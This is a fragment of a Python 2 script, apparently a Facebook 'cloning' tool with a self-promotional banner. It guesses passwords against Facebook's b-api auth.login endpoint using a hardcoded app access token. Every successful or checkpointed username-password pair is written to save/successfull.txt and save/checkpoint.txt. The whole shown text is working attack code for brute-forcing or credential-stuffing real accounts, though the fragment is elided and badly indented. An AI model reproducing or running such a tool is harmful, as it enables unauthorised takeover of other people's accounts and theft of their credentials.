...
\033[1;91m [       BEENAM X  BADSHAH   ]

\x1b[1;92m=============================
\x1b[1;93m Author  : BEENAM BADSHAH
\x1b[1;93m BOSS    :     BADSHAH
\x1b[1;93m FaceBook: BEENAM BADSHAH
\x1b[1;93m  REQUEST: NAMAZ KI PABANDI KAREEN 
\x1b[1;92m=============================
\x1b[1;93m     ➾       NOTE !
\x1b[1;91m=======================================
\x1b[1;95m     ➾ SPEED CLONING KY LEY 5 SECOND AIRPLANE MODE ON
\x1b[1;91m======================================= '''                                                                                                                                                                                                                                                                                                                                                  
...
def menu():
	os.system('clear')
	print logo
	print "\033[1;99m         [ BEENAM BADSHAH{ SUCCESSFUL } ]"
	print
		...
		try:
			...
			if 'access_token' in q:
				...
				if 'www.facebook.com' in q['error_msg']:
					print '\x1b[1;95mBadshah\x1b[1;95m[iD iZ OK]\x1b[1;95m-\x1b[1;95m[user]\x1b[1;95m-' + k + c + user + '-\x1b[1;95m[pass]\x1b[1;95m-' + pass1
					...
					data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
			                q = json.load(data)
					if 'access_token' in q:
		                        	print '\x1b[1;92m[ Ok ]\x1b[1;92m-\x1b[1;92m(u)\x1b[1;92m-' + k + c + user + '-\x1b[1;92m(p)\x1b[1;92m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;91m-' + pass2                            											
						okb = open('save/successfull.txt', 'a')
						...
						if 'www.facebook.com' in q['error_msg']:
							print '\x1b[1;95mBadshah \x1b[1;95m[iD iZ OK]\x1b[1;95m-\x1b[1;95m[user]\x1b[1;95m-' + k + c + user + '-\x1b[1;95m[pass]\x1b[1;95m-' + pass2
							cps = open('save/checkpoint.txt', 'a')
							...
							data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
			                                q = json.load(data)
							if 'access_token' in q:
								print '\x1b[1;92m[ OK ]\x1b[1;92m-\x1b[1;92m(u)\x1b[1;92m-' + k + c + user + '-\x1b[1;92m(p)\x1b[1;92m-' + pass3
								okb = open('save/successfull.txt', 'a')
								...
								if 'www.facebook.com' in q['error_msg']:
									print '\x1b[1;95mUsama \x1b[1;95m[iD iZ CP]\x1b[1;95m-\x1b[1;95m[user]\x1b[1;95m-' + k + c + user + '-\x1b[1;95m[pass]\x1b[1;95m-' + pass3
									cps = open('save/checkpoint.txt', 'a')
